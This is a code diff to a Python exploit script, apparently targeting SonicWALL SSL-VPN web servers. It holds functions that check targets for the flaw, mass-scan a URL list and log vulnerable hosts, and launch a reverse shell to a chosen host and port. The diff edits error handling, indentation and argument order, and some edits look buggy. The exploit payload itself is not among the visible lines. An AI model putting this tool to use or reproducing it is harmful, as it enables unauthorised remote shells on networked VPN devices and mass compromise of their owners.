@@ -6,7 +6,7 @@
 @Author  :   _0xf4n9x_
 @Version :   1.0
 @Contact :   fanq.xu@gmail.com
-@Desc    :   SonicWALL SSL-VPN Web Server Remote Exploit
+@Desc    :   SonicWALL SSL-VPN Web Server Vulnerable Exploit
 """
 
 
@@ -39,8 +39,6 @@ def verify(url):
             return 1
         else:
             print(url + " is not vulnerable! :(")
-    except exceptions.Timeout as e:
-        print(str(e.message))
     except exceptions.HTTPError as e:
         print(str(e.message))
     except:
@@ -60,7 +58,7 @@ def batch_verify(file):
                 if verify(url) == 1:
                     with open("success.txt", "a+") as f:
                         f.write(url + "\n")
-            f.close()
+                    f.close()
 
 
 def exploit(url, host, port):
@@ -77,8 +75,6 @@ def exploit(url, host, port):
             print('Reverse Shell Successed! :)')
         else:
             print('Reverse Shell Failed! :(')
-    except exceptions.Timeout as e:
-        print(str(e.message))
     except exceptions.HTTPError as e:
         print(str(e.message))
     except:
@@ -106,10 +102,10 @@ def main():
         title()
     elif sys.argv[1] in ['-u','--url']:
         verify(args.url)
-    elif set([sys.argv[1], sys.argv[3], sys.argv[5]]) < set(['-e', '--exploit', '-rh', '-rp']):
-        exploit(args.exploit, args.rh, args.rp)
     elif sys.argv[1] in ['-f', '--file']:
         batch_verify(args.file)
+    elif set([sys.argv[1], sys.argv[3], sys.argv[5]]) < set(['-e', '--exploit', '-rh', '-rp']):
+        exploit(args.exploit, args.rh, args.rp)
     else:
         parser.print_help()
         title()
